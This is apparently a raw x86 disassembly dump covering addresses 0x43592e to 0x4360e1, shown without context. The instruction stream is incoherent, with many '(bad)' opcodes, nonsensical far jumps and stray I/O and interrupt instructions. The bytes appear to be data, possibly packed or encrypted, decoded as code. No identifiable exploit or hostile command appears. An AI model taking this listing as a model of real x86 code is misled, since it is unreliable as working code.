  43592e:	jmp    0x82ff:0x4c3282d6
  435935:	inc    esi
  435936:	mov    al,ds:0x83363d
  43593b:	add    BYTE PTR [eax],al
  43593d:	add    BYTE PTR [eax],al
  43593f:	fdiv   DWORD PTR [ebp-0xa8ab97e]
  435945:	(bad)  
  435947:	sub    esp,ecx
  435949:	mov    DWORD PTR [ebp+0x6c27aa6b],0x7d4feb12
  435953:	mov    ecx,ds
  435955:	std    
  435956:	out    0xab,al
  435958:	ins    BYTE PTR es:[edi],dx
  435959:	(bad)  
  43595a:	stc    
  43595b:	je     0x4359a0
  43595d:	pop    eax
  43595e:	stc    
  43595f:	inc    ebx
  435960:	adc    eax,0x825d5a75
  435965:	retf   
  435966:	cld    
  435967:	loop   0x4358f4
  435969:	cmp    DWORD PTR [edx+0x4d],0xffffffa9
  43596d:	dec    ecx
  43596e:	inc    edx
  43596f:	(bad)  
  435970:	adc    bl,BYTE PTR [eax-0x7b]
  435973:	xor    esi,DWORD PTR [ecx+0x7b]
  435976:	inc    esp
  435977:	ja     0x4359a5
  435979:	jnp    0x435905
  43597b:	adc    eax,0xfefffdbb
  435980:	xor    ah,BYTE PTR [eax+0x14a97512]
  435986:	stc    
  435987:	sbb    esp,DWORD PTR [edx]
  435989:	or     BYTE PTR [esi-0x12],al
  43598c:	pop    edx
  43598d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43598e:	adc    dh,BYTE PTR [ebp-0x57]
  435991:	jl     0x43591d
  435993:	in     eax,dx
  435994:	(bad)  
  435996:	(bad)  
  435997:	in     eax,dx
  435998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435999:	out    dx,al
  43599a:	(bad)  
  43599b:	fmul   DWORD PTR [eax-0x12]
  43599e:	push   DWORD PTR [edx-0x57]
  4359a1:	pop    eax
  4359a3:	add    BYTE PTR [eax],al
  4359a5:	add    BYTE PTR [eax],al
  4359a7:	add    bl,dl
  4359a9:	stos   BYTE PTR es:[edi],al
  4359aa:	popa   
  4359ab:	or     BYTE PTR [ecx],0xac
  4359ae:	std    
  4359af:	(bad)  
  4359b0:	call   0x75d7d7dc
  4359b5:	stos   DWORD PTR es:[edi],eax
  4359b6:	std    
  4359b7:	xchg   bl,cl
  4359b9:	cmp    DWORD PTR [edx+eax*2-0x2f],0x24
  4359be:	mov    esp,0xe5033d7d
  4359c3:	push   ebp
  4359c4:	jbe    0x435a41
  4359c6:	in     eax,0x3
  4359c8:	jne    0x4359cc
  4359ca:	inc    si
  4359cc:	jno    0x4359cc
  4359ce:	pop    edi
  4359cf:	jns    0x4359b2
  4359d1:	adc    bh,ah
  4359d3:	add    eax,DWORD PTR [esi-0x56ce9209]
  4359d9:	jg     0x435970
  4359db:	dec    ebx
  4359dc:	je     0x43596b
  4359de:	sbb    DWORD PTR [eax+edi*8],ecx
  4359e1:	retf   
  4359e2:	mov    es,WORD PTR ds:0x1d36cba0
  4359e8:	sub    edx,DWORD PTR [ebx+0x38]
  4359eb:	xor    cl,ch
  4359ed:	fcmovnu st,st(0)
  4359ef:	add    esi,DWORD PTR [ebp-0x73]
  4359f2:	xor    DWORD PTR [eax-0x8],ebx
  4359f5:	clc    
  4359f6:	gs mov edi,0x28218b65
  4359fc:	int    0xfb
  4359fe:	jb     0x4359c8
  435a00:	mov    esp,0xb514f98d
  435a05:	sti    
  435a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435a07:	repz dec ebp
  435a09:	or     DWORD PTR [ebx+eax*8+0x0],edi
  435a0d:	add    BYTE PTR [eax],al
  435a0f:	add    BYTE PTR [eax],al
  435a11:	aas    
  435a12:	pop    ebp
  435a13:	retw   
  435a15:	fwait
  435a16:	push   esi
  435a17:	es test bh,cl
  435a1a:	(bad)  
  435a1c:	add    esi,DWORD PTR [ebp+0x2]
  435a1f:	mov    ebx,0x8b50f80b
  435a24:	jle    0x4359d1
  435a26:	cmp    ch,dl
  435a28:	jl     0x4359e9
  435a2a:	cli    
  435a2b:	in     eax,0xbd
  435a2d:	push   eax
  435a2e:	add    al,0xd6
  435a30:	mov    edx,0xc5be02db
  435a35:	lds    edx,FWORD PTR [ebx-0x67]
  435a38:	fild   DWORD PTR [ebx]
  435a3a:	repz out 0x3,al
  435a3d:	lock aas 
  435a3f:	add    BYTE PTR [ebp+0x257cfcc1],al
  435a45:	inc    esi
  435a46:	add    BYTE PTR [edx+0x45],0x51
  435a4a:	test   al,0xed
  435a4c:	fidiv  WORD PTR [edx]
  435a4e:	jg     0x435a5a
  435a50:	push   0xffffffb0
  435a52:	adc    al,BYTE PTR [eax]
  435a54:	ficomp WORD PTR [edx+0x3ac6fa21]
  435a5a:	pop    ebx
  435a5b:	pop    edx
  435a5c:	jb     0x435a94
  435a5e:	dec    edi
  435a5f:	pop    ebx
  435a60:	stos   BYTE PTR es:[edi],al
  435a61:	mov    ebp,0xbd9dccc5
  435a66:	(bad)
  435a69:	sub    eax,0x2dadccc6
  435a6e:	(bad)  
  435a6f:	int3   
  435a70:	cmp    al,0x5e
  435a72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435a73:	test   DWORD PTR [eax+eax*1],ebx
  435a76:	add    BYTE PTR [eax],al
  435a78:	add    BYTE PTR [eax],al
  435a7a:	fst    DWORD PTR [edx+0x2d]
  435a7d:	jg     0x435afd
  435a7f:	int3   
  435a80:	je     0x435a8d
  435a82:	dec    esi
  435a83:	stc    
  435a84:	sbb    esi,DWORD PTR [edx+0x60552e00]
  435a8a:	and    DWORD PTR [esi],edx
  435a8c:	xchg   eax,ebx
  435a8e:	mov    ds:0x29f16f7f,al
  435a93:	sub    DWORD PTR [eax],ebx
  435a95:	bound  ebp,QWORD PTR [ecx+0xa]
  435a98:	xor    eax,0x7d044537
  435a9d:	dec    ebx
  435a9e:	js     0x435a21
  435aa0:	dec    edi
  435aa1:	stc    
  435aa2:	or     eax,0x76ec308a
  435aa7:	add    al,BYTE PTR [edi+0x431f9f9]
  435aad:	jo     0x435a78
  435aaf:	push   es
  435ab0:	xchg   DWORD PTR [ecx-0x2e8f806a],ebx
  435ab6:	loope  0x435aea
  435ab8:	cmp    al,0x26
  435aba:	mov    cl,0xe
  435abc:	add    BYTE PTR [eax],al
  435abe:	fdiv   st(6),st
  435ac0:	dec    DWORD PTR [eax+0x48815004]
  435ac6:	fdiv   QWORD PTR [esi]
  435ac8:	dec    eax
  435ac9:	dec    esp
  435aca:	xchg   ebx,eax
  435acb:	jle    0x435a8d
  435acd:	sbb    ebx,DWORD PTR [esp+eax*1]
  435ad0:	stc    
  435ad1:	call   FWORD PTR [esp+eax*1]
  435ad4:	mov    edi,0xf9acd080
  435ad9:	jmp    FWORD PTR [ebx]
  435adb:	shl    edi,0xff
  435ade:	add    BYTE PTR [eax],al
  435ae0:	add    BYTE PTR [eax],al
  435ae2:	add    BYTE PTR [edi],cl
  435ae4:	les    edx,FWORD PTR [esi+0x5d]
  435ae7:	fidiv  WORD PTR [edi-0x3f354807]
  435aed:	idiv   edi
  435aef:	push   0xffffffe9
  435af1:	mov    ecx,0xcc6fdc04
  435af6:	int3   
  435af7:	sbb    BYTE PTR [eax-0x34],dh
  435afa:	int3   
  435afb:	mov    eax,ds:0x798bec3b
  435b00:	mov    dh,0x2c
  435b02:	shl    BYTE PTR [edi+0x471a7479],cl
  435b08:	ds sbb al,0x3b
  435b0b:	push   cs
  435b0c:	dec    eax
  435b0d:	or     edx,DWORD PTR [ecx+0x55]
  435b10:	repz daa 
  435b12:	mov    esp,ebp
  435b14:	jno    0x5719e76a
  435b1a:	dec    DWORD PTR [ebx-0x40]
  435b1d:	push   ebp
  435b1e:	ret    0x390
  435b21:	mov    eax,0xf7c03bfe
  435b26:	pop    ebp
  435b27:	pop    esi
  435b28:	mov    bh,0xf9
  435b2a:	retf   
  435b2b:	loope  0x435b69
  435b2d:	in     al,dx
  435b2e:	mov    ebx,ecx
  435b30:	mov    ebx,0x47a58550
  435b35:	je     0x435ac2
  435b37:	adc    eax,0x75ff7e9f
  435b3c:	xchg   ebp,eax
  435b3d:	pop    eax
  435b3e:	dec    ebp
  435b3f:	ret    
  435b40:	and    al,0x50
  435b42:	or     al,0xf8
  435b44:	mov    dh,0x45
  435b46:	add    al,BYTE PTR [eax]
  435b48:	add    BYTE PTR [eax],al
  435b4a:	add    BYTE PTR [eax],al
  435b4c:	xchg   ah,ah
  435b4e:	leave  
  435b4f:	fimul  DWORD PTR [esi-0x61]
  435b52:	jbe    0x435b2e
  435b54:	xor    al,0xb4
  435b56:	cli    
  435b57:	cmp    al,0xf6
  435b59:	sahf   
  435b5a:	adc    al,0x7b
  435b5c:	jbe    0x435b8a
  435b5e:	fimul  DWORD PTR [ecx]
  435b60:	clc    
  435b61:	(bad)  
  435b62:	push   eax
  435b63:	adc    dh,dh
  435b65:	(bad)  
  435b66:	cld    
  435b67:	jnp    0x435be1
  435b69:	sub    al,0xc2
  435b6b:	or     DWORD PTR [ebx-0x42aadc5b],ecx
  435b71:	outs   dx,BYTE PTR ds:[esi]
  435b72:	ret    
  435b73:	stc    
  435b74:	cli    
  435b75:	pop    es
  435b76:	and    DWORD PTR [esi+0x4178a97d],edi
  435b7c:	mov    eax,ds:0x8174c41e
  435b81:	ror    BYTE PTR [esp+0x61],cl
  435b85:	mov    al,0x2d
  435b87:	test   DWORD PTR [ecx+edx*8],esi
  435b8a:	js     0x435bd3
  435b8c:	xchg   ecx,eax
  435b8d:	sbb    ebx,eax
  435b8f:	iret   
  435b90:	out    dx,al
  435b91:	(bad)  
  435b93:	jl     0x435b46
  435b95:	mov    al,ds:0xa96941bc
  435b9a:	std    
  435b9b:	push   DWORD PTR [ebp+0x7a]
  435b9e:	jbe    0x435bf9
  435ba0:	ins    DWORD PTR es:[edi],dx
  435ba1:	and    cl,BYTE PTR [ebx+0x24]
  435ba4:	lea    esi,[eax-0x3c]
  435ba7:	stc    
  435ba8:	xchg   edx,eax
  435ba9:	pop    esi
  435baa:	sub    BYTE PTR [ecx+0x28],bl
  435bad:	jmp    0x435baa
  435baf:	inc    DWORD PTR [eax]
  435bb1:	add    BYTE PTR [eax],al
  435bb3:	add    BYTE PTR [eax],al
  435bb5:	retf   0xc2ee
  435bb8:	stc    
  435bb9:	jp     0x435b42
  435bbb:	and    bh,BYTE PTR [esi-0x4818fd83]
  435bc1:	cmp    edi,eax
  435bc3:	sub    edi,DWORD PTR [eax+0x78bcc731]
  435bc9:	dec    ecx
  435bca:	mov    ah,BYTE PTR [ebx+esi*8+0x91df1c1]
  435bd1:	or     BYTE PTR [esi],al
  435bd3:	arpl   WORD PTR [edx+0xbe70275],ax
  435bd9:	pop    ebp
  435bda:	das    
  435bdb:	imul   eax,DWORD PTR [eax+0x4f1f0eae],0x4e6e4cad
  435be5:	ins    DWORD PTR es:[edi],dx
  435be6:	stc    
  435be7:	aad    0x4f
  435be9:	ins    BYTE PTR es:[edi],dx
  435bea:	mov    DWORD PTR [ecx],esp
  435bec:	and    al,0xfa
  435bee:	push   esp
  435bef:	fisttp WORD PTR [eax]
  435bf1:	enter  0xe42e,0xa
  435bf5:	lahf   
  435bf6:	fidivr WORD PTR [ebx]
  435bf8:	stc    
  435bf9:	pushf  
  435bfa:	jp     0x435ba5
  435bfc:	(bad)  
  435bfd:	in     al,dx
  435bfe:	mov    ch,0x3e
  435c00:	daa    
  435c01:	sub    edx,DWORD PTR [ebx]
  435c03:	out    0x78,eax
  435c05:	das    
  435c06:	jmp    0x3e7:0x19a95c39
  435c0d:	pop    ebx
  435c0e:	add    ebx,DWORD PTR [eax]
  435c10:	lds    esp,FWORD PTR [ebp-0x467f8077]
  435c16:	push   es
  435c17:	scas   al,BYTE PTR es:[edi]
  435c18:	enter  0x0,0x0
  435c1c:	add    BYTE PTR [eax],al
  435c1e:	inc    esi
  435c1f:	push   es
  435c20:	or     ah,BYTE PTR [esi]
  435c22:	in     eax,dx
  435c23:	mov    dh,0x62
  435c25:	les    ebp,FWORD PTR [ecx+ebx*2+0x285c1bc]
  435c2c:	pop    esi
  435c2d:	imul   edx,DWORD PTR cs:[eax+0x60],0x704c7145
  435c35:	and    al,0x41
  435c37:	stos   BYTE PTR es:[edi],al
  435c38:	out    0xc4,eax
  435c3a:	jl     0x435bf1
  435c3c:	add    BYTE PTR [edx-0x32],ah
  435c3f:	adc    ebp,0x427e62b5
  435c45:	shr    ebp,1
  435c47:	dec    eax
  435c48:	and    al,0xb6
  435c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435c4b:	mov    ebx,0xa1a6acf
  435c50:	shl    DWORD PTR [edi-0x16064aa6],0x76
  435c57:	pop    ebx
  435c58:	pop    edx
  435c59:	jb     0x435c90
  435c5b:	dec    edi
  435c5c:	pop    ebx
  435c5d:	sub    eax,DWORD PTR [esi-0x4b]
  435c60:	mov    cl,0xf3
  435c62:	ss mov ebx,0x749442f9
  435c68:	adc    cl,ch
  435c6a:	xor    al,dh
  435c6c:	int3   
  435c6d:	scas   al,BYTE PTR es:[edi]
  435c6e:	mov    cl,0x46
  435c70:	add    bl,dh
  435c72:	mov    dh,0x2
  435c74:	shr    DWORD PTR [ecx],0xad
  435c77:	std    
  435c78:	(bad)  
  435c79:	call   0x19841ff4
  435c7e:	jno    0x435c94
  435c80:	inc    eax
  435c81:	jmp    0x435c86
  435c86:	add    BYTE PTR [edi+0x76ec5841],bh
  435c8c:	add    al,BYTE PTR [eax]
  435c8e:	stos   BYTE PTR es:[edi],al
  435c8f:	(bad)
  435c92:	cmp    al,0xea
  435c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435c95:	dec    edi
  435c96:	aaa    
  435c97:	add    ah,BYTE PTR [edi]
  435c99:	sbb    al,0x6a
  435c9b:	aaa    
  435c9c:	out    dx,al
  435c9d:	call   DWORD PTR ds:0xc273b9f2
  435ca3:	jmp    0x435cec
  435ca5:	and    al,0x62
  435ca7:	dec    edx
  435ca8:	loop   0x435c61
  435caa:	call   0x3a435f25
  435caf:	fnstcw WORD PTR [esi+0x45]
  435cb2:	add    DWORD PTR [ebx-0x4b],ecx
  435cb5:	dec    ecx
  435cb6:	mov    eax,0x7dc3b7
  435cbb:	pop    eax
  435cbc:	adc    al,BYTE PTR [ecx-0x3f7677ba]
  435cc2:	jne    0x435c5b
  435cc4:	pop    ds
  435cc5:	mov    eax,0x5c01
  435cca:	pop    esi
  435ccb:	out    0x69,eax
  435ccd:	push   ebp
  435cce:	ret    
  435ccf:	aas    
  435cd0:	shl    BYTE PTR [ecx],0x46
  435cd3:	xor    al,0xfb
  435cd5:	or     cl,BYTE PTR [ebx+0x1b39bf2]
  435cdb:	pop    esp
  435cdc:	add    BYTE PTR [eax],al
  435cde:	shr    DWORD PTR [esi-0x7b],cl
  435ce1:	ds xor ch,dl
  435ce4:	dec    eax
  435ce5:	sub    al,0x89
  435ce7:	or     ch,BYTE PTR [eax+0x7b24]
  435ced:	add    BYTE PTR [eax],al
  435cef:	add    BYTE PTR [eax*4+0x7657283e],ch
  435cf6:	push   0x28
  435cf8:	xchg   edi,eax
  435cf9:	inc    esp
  435cfa:	or     al,0x8b
  435cfc:	dec    edx
  435cfd:	mov    edx,0x4ec42b49
  435d02:	dec    edx
  435d03:	call   0x3d08b4
  435d08:	xchg   edi,eax
  435d09:	dec    ecx
  435d0a:	sub    BYTE PTR [ebx+0x46810418],al
  435d10:	shl    BYTE PTR [eax],0xbf
  435d13:	inc    esi
  435d14:	mov    esp,0xccffffff
  435d19:	lods   al,BYTE PTR ds:[esi]
  435d1a:	mov    ecx,0x556a575e
  435d1f:	ret    
  435d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d21:	dec    ecx
  435d22:	xor    BYTE PTR [ecx-0x38cc3d67],cl
  435d28:	mov    edx,0x207d810a
  435d2d:	test   BYTE PTR [edi-0x7cfc1875],bh
  435d33:	push   esi
  435d34:	mov    bl,bh
  435d36:	dec    ebp
  435d37:	xor    BYTE PTR [ebp+0x79],dh
  435d3a:	jmp    0x4622:0xa57724c8
  435d41:	test   eax,0xf53084fd
  435d46:	add    esp,0x74bb0069
  435d4c:	cdq    
  435d4d:	and    BYTE PTR [edx+0xc],al
  435d50:	(bad)  
  435d51:	push   0xfffffff1
  435d53:	push   eax
  435d54:	add    BYTE PTR [eax],al
  435d56:	add    BYTE PTR [eax],al
  435d58:	add    BYTE PTR [esi+0x4d4f4cdc],cl
  435d5e:	popf   
  435d5f:	bnd call DWORD PTR [edx+0x20]
  435d63:	push   edi
  435d64:	sub    dh,dh
  435d66:	in     al,0x8
  435d68:	xchg   ebx,eax
  435d6a:	jns    0x435dca
  435d6c:	xchg   DWORD PTR [ebx-0x2c400d43],esp
  435d72:	and    BYTE PTR [eax+0x4630365b],ch
  435d78:	sub    BYTE PTR [ebx+eiz*8-0xd],dh
  435d7c:	ss mov bl,0x19
  435d7f:	xor    DWORD PTR [ecx],eax
  435d81:	cmp    bl,bl
  435d83:	repz dec DWORD PTR [edx]
  435d86:	test   eax,0x5ab84fd
  435d8b:	sti    
  435d8c:	iret   
  435d8d:	xchg   BYTE PTR [esi+0xafccf04],ah
  435d93:	lock pop eax
  435d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435d96:	imul   ebx,DWORD PTR [esi-0x7b],0xccc2f5d8
  435d9d:	test   eax,0xfeec8af5
  435da2:	fisttp QWORD PTR [ebx]
  435da4:	jge    0x435d7f
  435da6:	js     0x435e00
  435da8:	xor    DWORD PTR [ebp+0x66ba81a3],0xffffffa9
  435daf:	std    
  435db0:	test   BYTE PTR ds:0x7af982c5,ch
  435db6:	add    ch,BYTE PTR [ebx+0x75]
  435db9:	jo     0x435dbd
  435dbb:	out    0x84,eax
  435dbd:	add    BYTE PTR [eax],al
  435dbf:	add    BYTE PTR [eax],al
  435dc1:	add    BYTE PTR ds:0xf910e706,bl
  435dc7:	push   0x7f7503f6
  435dcc:	inc    DWORD PTR [ebx]
  435dce:	push   es
  435dcf:	or     BYTE PTR [esi+0x3c],ah
  435dd2:	jno    0x435dd6
  435dd4:	loop   0x435d5c
  435dd6:	or     edx,DWORD PTR [esi]
  435dd8:	out    0x3,eax
  435dda:	call   0x777a4bd0
  435ddf:	leave  
  435de0:	loop   0x435df1
  435de2:	jne    0x435de6
  435de4:	out    0x8c,eax
  435de6:	mov    ebp,0xf2145dfe
  435deb:	aas    
  435dec:	jge    0x44b1709f
  435df2:	jno    0x435e49
  435df4:	pop    esi
  435df5:	popa   
  435df6:	ins    DWORD PTR es:[edi],dx
  435df7:	jnp    0x435d9d
  435df9:	mov    edi,0x8cb747f2
  435dfe:	je     0x435e58
  435e00:	outs   dx,BYTE PTR ds:[esi]
  435e01:	cmp    BYTE PTR [ecx+0x7b],bl
  435e04:	and    al,0xb4
  435e06:	cli    
  435e07:	push   edi
  435e08:	iret   
  435e09:	mov    bh,BYTE PTR [esi+0x1d46aaa2]
  435e0f:	add    esp,edi
  435e11:	add    esi,DWORD PTR [ebp-0x7b]
  435e14:	scas   eax,DWORD PTR es:[edi]
  435e15:	and    DWORD PTR [ecx+ecx*4-0x39],edi
  435e19:	adc    dh,BYTE PTR [ebp+0x2]
  435e1c:	mov    ds:0xdc0ef7e7,al
  435e21:	inc    esp
  435e22:	jne    0x435ea1
  435e24:	sub    cl,BYTE PTR [eax+eax*1]
  435e27:	add    BYTE PTR [eax],al
  435e29:	add    BYTE PTR [eax],al
  435e2b:	test   dl,0x14
  435e2e:	or     eax,0x3f309b4
  435e33:	jne    0x435e37
  435e35:	nop
  435e36:	jg     0x435ea2
  435e38:	add    al,BYTE PTR [eax]
  435e3a:	jmp    0xfa540b38
  435e3f:	nop
  435e40:	cs jnp 0x435ea8
  435e43:	jbe    0x435e40
  435e45:	xor    edx,0xffffff80
  435e48:	add    al,BYTE PTR [eax]
  435e4a:	out    0xc,al
  435e4c:	mov    al,0xfa
  435e4e:	pushf  
  435e4f:	retf   0xca87
  435e52:	sbb    dl,dh
  435e54:	lock jl 0x435e7e
  435e57:	outs   dx,BYTE PTR ds:[esi]
  435e58:	mov    DWORD PTR [ebx+0x31],edx
  435e5b:	jns    0x435e27
  435e5d:	jge    0x435e8e
  435e5f:	xchg   BYTE PTR [eax],ah
  435e61:	ficomp DWORD PTR [edi]
  435e63:	lods   eax,DWORD PTR ds:[esi]
  435e64:	cli    
  435e65:	std    
  435e66:	xchg   esp,eax
  435e67:	je     0x435e9a
  435e69:	cmc    
  435e6a:	test   BYTE PTR [ecx],0x2
  435e6d:	add    BYTE PTR [esp+ecx*2+0x76930027],dl
  435e74:	sub    BYTE PTR [eax],al
  435e76:	adc    DWORD PTR ds:0xffe90013,edx
  435e7c:	inc    edx
  435e7d:	sbb    BYTE PTR [ebx-0x2ab48290],al
  435e83:	pop    ebx
  435e84:	mov    DWORD PTR [ebx-0x33],ebx
  435e87:	out    dx,al
  435e88:	push   edx
  435e89:	sbb    BYTE PTR [eax],bh
  435e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435e8c:	call   0x0:0xf687
  435e93:	add    BYTE PTR [esi+0x2],dh
  435e96:	test   DWORD PTR [ecx+eax*8],ebx
  435e99:	(bad)  
  435e9b:	jo     0x435e4f
  435e9d:	or     ch,BYTE PTR ds:0xff02babf
  435ea3:	call   0x392a611e
  435ea8:	mov    BYTE PTR [edx],al
  435eaa:	add    BYTE PTR [edx+0x32],dh
  435ead:	loop   0x435e6f
  435eaf:	imul   eax,DWORD PTR cs:[edx],0x8576e900
  435eb6:	rol    BYTE PTR [eax],0xc0
  435eb9:	pop    es
  435eba:	mov    edi,0xf76ffc40
  435ebf:	jmp    FWORD PTR [ebx]
  435ec1:	js     0x435f02
  435ec3:	or     BYTE PTR [ebp-0x736e7c01],bl
  435ec9:	add    al,0x0
  435ecb:	lar    eax,bp
  435ece:	mov    ecx,0xc37b94e0
  435ed3:	shl    DWORD PTR ds:0x7fc0fafe,0xd2
  435eda:	mov    cl,0x1f
  435edc:	mov    WORD PTR [eax+eax*1],es
  435edf:	imul   DWORD PTR [ebp+0x2375ca79]
  435ee5:	jge    0x435eb2
  435ee7:	sub    BYTE PTR [esi-0x1],0x7f
  435eeb:	cli    
  435eec:	fs clc 
  435eee:	or     DWORD PTR [ebx+0x5582fc21],ecx
  435ef4:	mov    DWORD PTR fs:[eax+0x18],0x0
  435efc:	add    BYTE PTR [ebx],ch
  435efe:	idiv   BYTE PTR [edi]
  435f00:	add    BYTE PTR [ebp+0x78],ah
  435f03:	adc    BYTE PTR [eax],al
  435f05:	sbb    al,0x7d
  435f07:	aas    
  435f08:	and    al,0x5d
  435f0a:	pop    ebx
  435f0b:	add    al,0x8b
  435f0d:	out    0x84,eax
  435f0f:	(bad)  [edi]
  435f11:	(bad)  
  435f12:	pop    ebp
  435f13:	add    al,0x83
  435f15:	(bad)  
  435f17:	jl     0x435ed9
  435f19:	mov    eax,ds:0x704f82ac
  435f1e:	sub    al,0xf9
  435f20:	dec    DWORD PTR [esp+eax*1]
  435f23:	bound  eax,QWORD PTR [eax]
  435f25:	punpckldq mm4,DWORD PTR [edx+0x0]
  435f29:	ss push es
  435f2b:	adc    DWORD PTR [edi-0x20],0xcc2eda5b
  435f32:	add    eax,DWORD PTR [ebx-0x795e8ab3]
  435f38:	push   ebx
  435f39:	int    0x5a
  435f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435f3c:	or     dl,cl
  435f3e:	mov    WORD PTR [esi-0x23],?
  435f41:	ja     0x435f5f
  435f43:	mov    BYTE PTR [edi],0xfc
  435f46:	loopne 0x435f63
  435f48:	xchg   DWORD PTR [ecx+ebp*2],esi
  435f4b:	mov    WORD PTR [ecx],ds
  435f4d:	inc    sp
  435f4f:	out    dx,al
  435f50:	icebp  
  435f51:	mov    WORD PTR [esi+0xd],?
  435f54:	add    BYTE PTR [ebp+0x14],dh
  435f57:	int3   
  435f58:	jb     0x435f0a
  435f5a:	and    al,0x58
  435f5c:	clc    
  435f5d:	mov    WORD PTR [edx+0xd],cs
  435f60:	add    BYTE PTR [eax],al
  435f62:	add    BYTE PTR [eax],al
  435f64:	add    BYTE PTR [eax],al
  435f66:	jne    0x435f9c
  435f68:	pop    eax
  435f69:	or     BYTE PTR [edx],bh
  435f6b:	pop    ebx
  435f6c:	adc    eax,0xfd59e329
  435f71:	test   al,cl
  435f73:	loope  0x435f20
  435f75:	xchg   DWORD PTR [ebp+0x537cfd99],eax
  435f7b:	test   eax,0x7df61e2e
  435f80:	mov    ecx,0xdb1d7200
  435f85:	adc    BYTE PTR [ebp-0x67],dh
  435f88:	or     dh,BYTE PTR [edx-0x3b64789]
  435f8e:	dec    BYTE PTR [esi]
  435f90:	into   
  435f91:	loopne 0x435f4a
  435f93:	sbb    al,0xc2
  435f95:	or     ah,ch
  435f97:	cmc    
  435f98:	mov    ebx,0xba1c2afd
  435f9d:	adc    BYTE PTR [edi+0x6559855f],al
  435fa3:	sbb    DWORD PTR [edi+0x50266a08],esi
  435fa9:	adc    BYTE PTR [ebp-0x67],dh
  435fac:	mov    ah,0xbd
  435fae:	jne    0x435f69
  435fb0:	add    al,0x0
  435fb2:	imul   eax,DWORD PTR [edx],0xfa3688f2
  435fb8:	mov    eax,ds:0x18df6d44
  435fbd:	inc    esp
  435fbe:	jne    0x435f59
  435fc0:	retf   0x7513
  435fc3:	add    ch,BYTE PTR [esi+0x45]
  435fc6:	xchg   ebp,eax
  435fc7:	test   DWORD PTR [edi+0x38],esp
  435fcd:	add    BYTE PTR [eax],al
  435fcf:	jnp    0x43604c
  435fd1:	sahf   
  435fd2:	ret    
  435fd3:	xchg   edx,eax
  435fd4:	stc    
  435fd5:	mov    gs:0xb4ef79a2,eax
  435fdb:	xor    al,0x12
  435fdd:	out    0x1,eax
  435fdf:	jne    0x435fe3
  435fe1:	fistp  DWORD PTR ds:0xc33b4cfd
  435fe7:	cwde   
  435fe8:	stc    
  435fe9:	int3   
  435fea:	add    esi,ebp
  435fec:	push   esp
  435fed:	dec    ebx
  435fee:	mov    esi,cs
  435ff0:	lahf   
  435ff1:	pop    esi
  435ff2:	inc    ebp
  435ff3:	lea    edx,[eax-0x69]
  435ff6:	stos   DWORD PTR es:[edi],eax
  435ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ff8:	adc    al,0xe7
  435ffa:	add    esi,eax
  435ffc:	push   edi
  435ffd:	pop    ds
  435ffe:	mov    esi,DWORD PTR [edx+ecx*1-0x4b67272a]
  436005:	and    al,BYTE PTR ds:0x3e7ae43
  43600b:	push   eax
  43600c:	or     BYTE PTR [esi-0x42],ah
  43600f:	push   ebp
  436010:	xor    ebp,eax
  436012:	sub    BYTE PTR [esi-0x6f31852],0x52
  436019:	test   DWORD PTR [ebx],0x190fd75
  43601f:	or     al,0x40
  436021:	ror    DWORD PTR [eax+0x41c7d23f],cl
  436027:	add    ah,0xef
  43602a:	mov    ah,BYTE PTR [esi+0x70dbe6aa]
  436030:	lods   al,BYTE PTR ds:[esi]
  436031:	add    BYTE PTR [ecx],cl
  436033:	add    BYTE PTR [eax],al
  436035:	add    BYTE PTR [eax],al
  436037:	add    BYTE PTR [edi-0x26d97a38],ah
  43603d:	add    al,0x1d
  436040:	je     0x435fc7
  436042:	pop    eax
  436043:	in     eax,0x9
  436045:	inc    esp
  436046:	adc    cl,ch
  436048:	je     0x43604c
  43604a:	add    BYTE PTR ds:0x955b85d3,dl
  436050:	in     eax,dx
  436051:	mov    DWORD PTR [ebp+0x8a5b79a],0xbf12dca8
  43605b:	cmp    BYTE PTR [esi+0x24],0x4
  43605f:	je     0x436094
  436061:	sahf   
  436062:	mov    BYTE PTR [ebx+eiz*8-0x1b8ac86],ch
  436069:	dec    ecx
  43606a:	jmp    0x504d91d1
  43606f:	cwde   
  436070:	into   
  436071:	ins    BYTE PTR es:[edi],dx
  436072:	adc    ebp,ecx
  436074:	jbe    0x435ffd
  436076:	push   ebx
  436077:	xor    edi,edi
  436079:	inc    edx
  43607a:	sbb    dl,bh
  43607c:	cmp    eax,0x712ef1df
  436081:	scas   eax,DWORD PTR es:[edi]
  436082:	stc    
  436083:	jmp    0x6a4707fe
  436088:	or     BYTE PTR [edx],dl
  43608a:	ins    DWORD PTR es:[edi],dx
  43608b:	retf   
  43608c:	cmc    
  43608d:	sub    ah,bh
  43608f:	jmp    0xef1fe6fd
  436094:	jbe    0x436098
  436096:	or     DWORD PTR [edi],edi
  436098:	je     0x436045
  43609a:	dec    ebx
  43609b:	in     eax,dx
  43609c:	add    BYTE PTR [eax],al
  43609e:	add    BYTE PTR [eax],al
  4360a0:	add    dl,bh
  4360a2:	mov    bh,0xcd
  4360a4:	leave  
  4360a5:	mov    bl,0x2f
  4360a7:	ret    0x1f1
  4360aa:	push   ecx
  4360ab:	clc    
  4360ac:	jmp    0xc848:0xf9fa2f2e
  4360b3:	test   DWORD PTR [eax],eax
  4360b5:	dec    ebx
  4360b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4360b7:	jle    0x436079
  4360b9:	test   al,0x10
  4360bb:	or     ebx,0x5d
  4360be:	test   DWORD PTR [bx+si],0x488100cc
  4360c5:	in     al,0x7b
  4360c7:	inc    edi
  4360c8:	and    BYTE PTR [edi-0x3b],al
  4360cb:	mov    ecx,0x397dd4e8
  4360d0:	or     al,0xeb
  4360d2:	inc    eax
  4360d3:	adc    BYTE PTR [eax],al
  4360d5:	into   
  4360d6:	add    BYTE PTR [eax],al
  4360d8:	je     0x4360ac
  4360da:	js     0x436131
  4360dc:	in     al,dx
  4360dd:	fstp   QWORD PTR [eax+ecx*1+0x6a]
  4360e1:	mov    ?,WORD PTR [ecx+0x4d]
